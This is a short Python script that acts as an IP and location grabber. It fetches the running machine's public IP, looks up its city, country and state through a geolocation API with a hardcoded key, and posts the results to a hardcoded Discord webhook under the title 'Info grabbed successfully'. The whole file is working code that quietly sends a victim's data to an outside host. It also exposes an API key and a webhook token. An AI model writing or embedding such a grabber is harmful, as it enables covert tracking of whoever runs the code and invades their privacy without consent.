import requests, json

addrInfo = json.loads(requests.get('https://api.ipgeolocation.io/ipgeo?apiKey=8377fcf8f02a40a996110c5f253a6ac6&ip='+requests.get('https://api.ipify.org').text).text)

payload = {
    'content': '', 
    'embeds': [{
        'title': 'Info grabbed successfully',
        'color': 14024959,
        'fields': [
            {
                'name': 'IP',
                'value': addrInfo['ip'],
                'inline': True
            },
            {
                'name': 'City', 
                'value': addrInfo['city'], 
                'inline': True
            },
            {
                'name': '',
                'value': '',
                'inline': False
            },
            {
                'name': 'Country',
                'value': addrInfo['country_name'],
                'inline': True
            },
            {
                'name': 'State',
                'value': addrInfo['state_prov'],
                'inline': True
            }
        ],
    }],
    'attachments': []
}

requests.post('https://discord.com/api/webhooks/1141825902842495110/tS2a3MVxJTWuA9Y561kldy4f9JJr7ys3qAv-ahsDbZiwX0fe8fM1HYXdOVe6RQjpBuve', data=json.dumps(payload), headers={'Content-Type': 'application/json'})